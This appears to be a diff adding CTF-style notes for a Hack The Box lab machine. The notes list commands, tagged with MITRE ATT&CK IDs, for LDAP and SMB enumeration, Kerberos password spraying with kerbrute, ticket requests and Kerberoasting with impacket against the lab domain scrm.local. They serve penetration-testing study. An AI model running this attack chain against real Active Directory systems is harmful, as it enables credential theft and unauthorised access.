@@ -1,0 +1,55 @@
+How To Hack The Box To Your OSCP (The Bonus Boxes)
+================================
+Resource Development
+--------------------------------
+
+# In CommandoVM
+
+cmd - ctrl + shift + enter
+ldp.exe
+
+# In Kali
+
+ldapsearch -H ldap://10.10.11.168 -x -s base namingcontexts
+ldapsearch -H ldap://10.10.11.168 -x -b "DC=scrm,DC=local"
+
+sudo crackmapexec -h
+sudo crackmapexec smb scrm.local
+
+# MITRE ATT&CK T1588.002: Resource Development, Obtain Capabilities: Tool
+
+sudo wget https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_linux_amd64
+sudo mv kerbrute_linux_amd64 kerbrute
+chmod +x kerbrute
+
+# MITRE ATT&CK T1110.003: Credential Access, Brute Force: Password Spraying
+
+sudo ./kerbrute passwordspray --user-as-pass --domain scrm.local --dc dc1.scrm.local users.lst
+
+smbclient -U ksimpson -L //dc1.scrm.local
+smbclient -U ksimpson@scrm.local -L //dc1.scrm.local
+man smbclient
+
+smbclient.py -k scrm.local/ksimpson:ksimpson@dc1.scrm.local -dc-ip dc1.scrm.local
+help
+share
+use public
+get Network Security CHanges.pdf
+
+sudo python3 /opt/impacket/examples/getTGT.py scrm.local/ksimpson:ksimpson
+export KRB5CCNAME=/home/kali/HTB/scrambled/ksimpson.ccache
+env 
+env | grep -i KRB5
+sudo apt install klist -y
+klist
+
+# MITRE ATT&CK T1588.002: Resource Development: Obtain Capabilities: Tool
+sudo rm -rf /opt/impacket*
+sudo git clone https://github.com/SecureAuthCorp/impacket.git /opt/impacket  && cd /opt/impacket
+sudo python3 ./setup.py install  
+
+export KRB5CCNAME=/home/kali/HTB/scrambled/ksimpson.ccache 
+
+# MITRE ATT&CK T1558.003, Credential Access: Steal or Forge Kerberos Tickets: Kerberoasting
+sudo python3 /opt/impacket/examples/GetUserSPNs.py scrm.local/ksimpson -dc-host dc1.scrm.local -k -no-pass -request  
+
